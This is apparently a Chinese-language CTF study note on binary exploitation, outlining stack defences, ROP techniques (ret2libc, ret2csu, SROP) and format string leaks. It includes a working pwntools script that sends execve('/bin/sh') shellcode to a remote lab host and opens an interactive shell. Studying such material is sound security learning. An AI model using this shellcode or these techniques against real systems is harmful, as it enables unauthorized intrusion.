### Shellcode
* `checksec`检测程序防御方式
* pwntools编写shellcode攻击脚本
* `cyclic 10`生成大小为10字符串
* [shellcode exp](http://shell-storm.org/shellcode/)
=== "Python"

    ``` python linenums="1"
    from pwn import *

    context.update(arch='i386', os='linux')
    # context.log_level = 'debug'
    r = remote('10.214.160.13', 11003)

    shellcode = asm('''
            mov edx, 0
            mov ecx, 0
            push 0x68732f
            push 0x6e69622f
            mov ebx, esp
            mov eax, 0xb
            int 0x80
    ''')
    r.send(shellcode)
    r.interactive()
    ```

### Defense
#### Canary
* 堆栈金丝雀，在函数调用时写入cookie，在返回时检查

#### NX
* 栈不可执行

#### ASLR
* 地址空间随机化

### ROP
#### BufferOverflow
* 利用缓冲区溢出非法覆盖返回地址并返回到写入的shellcode
* 面向返回编程
#### ret2text
* 当NX栈不可执行时
* 返回到可执行代码段
#### ret2shellcode
* 返回到一段恶意注入的shellcode
#### ret2syscall
* 返回到系统调用
* `ROPgedget`
#### ret2libc
* linux动态链接 可执行文件->PLT表->GOT表->libc
  * PLT程序链接表
  * GOT全局偏移表
* 建表是很麻烦的，延迟绑定 plt->got->plt->公共plt->_dl_runtime_resolve
  * 第一次调用时写入，然后再次调用
  * 后续调用直接用
* libcsearcher
#### ret2csu
* x64的传参前六个参数在寄存器上

### SROP

<!-- ???+ bug "Format String Bug" -->
### Format String Bug
* 全称格式化字符串漏洞
#### 内存泄露
* 以`printf()`为例
  * `%d` - 十进制 - 输出十进制整数
  * `%s` - 字符串 - 从内存中读取字符串
  * `%x` - 十六进制 - 输出十六进制数
  * `%c` - 字符 - 输出字符
  * `%p` - 指针 - 指针地址
  * `%n` - 到目前为止所写的字符数
* `printf(s);  // s = "%x%x%x"`会泄露栈上的数据，相对于格式化字符串偏移的数据

#### 内存修改